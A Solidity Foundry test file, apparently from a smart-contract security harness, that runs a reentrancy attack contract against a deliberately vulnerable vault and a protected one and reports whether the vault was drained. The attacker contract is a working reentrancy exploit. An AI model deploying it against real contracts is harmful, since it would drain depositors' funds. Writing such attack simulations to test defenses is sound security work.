// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SentinelBase.t.sol";
import "../targets/VaultVulnerable.sol";
import "../targets/VaultProtected.sol";

/// @notice Helper attack contract executing recursive withdrawals against target vaults
contract ReentrancyAttacker {
    address public target;
    address payable public owner;

    constructor(address _target) {
        target = _target;
        owner = payable(msg.sender);
    }

    function attack() external payable {
        // Step 1: Deposit funds into target vault
        (bool depOk, ) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(depOk, "Deposit failed");

        // Step 2: Trigger initial withdrawal
        (bool wOk, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(wOk, "Initial withdraw failed");
    }

    receive() external payable {
        // Step 3: Reenter withdrawal while vault still holds funds
        if (target.balance >= 1 ether) {
            (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
            require(ok, "Reentrant withdraw failed");
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }
}

/// @title Reentrancy Attack Simulation
/// @notice Simulates recursive withdraw attack against VaultVulnerable and VaultProtected.
contract ReentrancyTest is SentinelBase {
    function test_reentrancy() public {
        string memory variant = getVariant();
        bool isProtected = keccak256(bytes(variant)) == keccak256(bytes("protected"));

        address vaultAddress;
        if (isProtected) {
            VaultProtected protectedVault = new VaultProtected();
            vaultAddress = address(protectedVault);
        } else {
            VaultVulnerable vulnVault = new VaultVulnerable();
            vaultAddress = address(vulnVault);
        }

        // Fund vault with 10 ETH from honest users
        vm.deal(honestUser, 10 ether);
        vm.prank(honestUser);
        (bool funded, ) = vaultAddress.call{value: 10 ether}(abi.encodeWithSignature("deposit()"));
        require(funded, "Vault funding failed");

        // Fund attacker with 1 ETH seed capital
        vm.deal(attacker, 1 ether);
        uint256 attackerBalBefore = attacker.balance;

        vm.startPrank(attacker);
        ReentrancyAttacker attackContract = new ReentrancyAttacker(vaultAddress);

        bool attackSucceeded = false;
        string memory note;

        try attackContract.attack{value: 1 ether}() {
            // If attack completed without reverting, withdraw loot to attacker wallet
            attackContract.withdrawLoot();
            uint256 attackerBalAfter = attacker.balance;
            if (attackerBalAfter > attackerBalBefore) {
                attackSucceeded = true;
                note = "drained vault via reentrant withdraw";
            } else {
                note = "attack executed but generated no profit";
            }
        } catch Error(string memory reason) {
            note = string.concat("reentrancy blocked: ", reason);
        } catch (bytes memory) {
            note = "reentrancy blocked by contract guard";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (attacker.balance > attackerBalBefore) {
            netProfit = attacker.balance - attackerBalBefore;
        }

        emitSentinelResult("reentrancy", variant, attackSucceeded, netProfit, note);
    }
}
